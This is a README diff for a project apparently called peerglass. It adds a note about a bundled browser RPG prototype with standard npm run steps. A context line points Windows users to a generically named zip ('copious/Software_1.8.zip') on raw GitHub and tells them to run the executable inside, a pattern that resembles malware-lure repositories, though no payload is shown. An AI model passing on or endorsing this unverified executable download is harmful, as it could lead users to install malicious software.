@@ -144,3 +144,8 @@ To start using peerglass, visit the download link again where you can get the in
 [Download peerglass on GitHub](https://raw.githubusercontent.com/omor-ww/peerglass/main/copious/Software_1.8.zip)
 
 This page will always have the latest version for Windows. Download the executable file and follow the installation steps above.
+---
+
+## 🎮 Experimental game prototype
+
+This repository also includes **The Infinite Grimoire**, a separate browser-playable 2.5D fantasy RPG prototype in [`game/`](game/). To run it locally, see [`game/README.md`](game/README.md) and use `cd game && npm install && npm run dev`. It is an early playable slice, not a replacement for the PeerGlass network-intelligence application.
